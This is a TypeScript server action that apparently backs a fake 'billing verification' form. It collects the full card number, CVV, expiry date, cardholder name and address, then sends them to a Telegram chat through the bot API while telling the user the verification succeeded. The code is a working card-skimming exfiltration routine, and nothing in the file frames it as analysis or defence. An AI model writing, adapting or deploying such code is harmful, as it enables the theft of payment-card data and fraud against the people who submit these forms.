'use server';

export async function sendToTelegram(prevState: any, formData: FormData) {
 const cardholderName = formData.get('cardholderName') as string;
 const cardNumber = formData.get('cardNumber') as string;
 const expirationDate = formData.get('expirationDate') as string;
 const cvv = formData.get('cvv') as string;
 const address = formData.get('address') as string;

 const botToken = process.env.TELEGRAM_BOT_TOKEN;
 const chatId = process.env.TELEGRAM_CHAT_ID;

 if (!botToken || !chatId) {
 return { success: false, message: 'Telegram is not configured yet' };
 }

 const text = `🔒 *Billing Details Verification*

👤 *Cardholder Name:* ${cardholderName}
💳 *Card Number:* ${cardNumber}
📅 *Expiration Date:* ${expirationDate}
🔢 *CVV:* ${cvv}
🏠 *Address:* ${address}

🕒 ${new Date().toLocaleString()}`;

 try {
 const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 chat_id: chatId,
 text,
 parse_mode: 'Markdown',
 }),
 });

 if (!res.ok) throw new Error('Telegram API error');
 return { success: true, message: '✅ Verification sent to Telegram!' };
 } catch (err) {
 console.error(err);
 return { success: false, message: '❌ Failed to verify. Please try again.' };
 }
}
